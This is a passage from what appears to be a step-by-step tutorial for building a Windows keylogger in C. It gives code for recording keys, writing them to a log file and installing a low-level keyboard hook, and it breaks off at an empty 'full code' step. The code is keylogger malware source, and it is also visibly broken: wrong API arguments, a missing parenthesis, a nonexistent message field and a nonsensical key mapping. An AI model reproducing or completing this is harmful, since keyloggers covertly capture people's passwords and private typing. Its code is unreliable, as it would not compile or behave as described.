            if (keyState->wKeys[i] != 0)
            {
                // Record the key
                char key = (i < 0x20) ? 'A' + i : (i == 0x2A ? '\0' : (i == 0x1C ? '\b' : '\x7E'));
                // Append to log file
                fLogger(key);
            }
        }
    }
}
```

### Step 3: Implement the Logger
Create a function to write keystrokes to a file:
```c
void fLogger(char key)
{
    FILE *file;
    fopen_s(&file, "a", "w");
    fprintf(file, "%c", key);
    fclose(file);
}
```

### Step 4: Set Up the Keyboard Hook
In the main function, set up and install the hook:
```c
int main()
{
    HWND hwnd = GetDesktopWindow();
    HHOOK hKeyboardHook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);

    if (hKeyboardHook == NULL)
    {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }

    // Start the hook
    MSG msg;
    while (GetMessage(hwnd, &msg)
    {
        if (msg.hwndFrom == hKeyboardHook)
        {
            // Process the message
            TranslateMessage(&msg);
            DispatchMessage(hwnd, msg);
        }
    }

    // Uninstall the hook
    UnhookWindowsHook(hwnd, hKeyboardHook);

    return 0;
}
```

### Step 5: Full Code with Error Handling
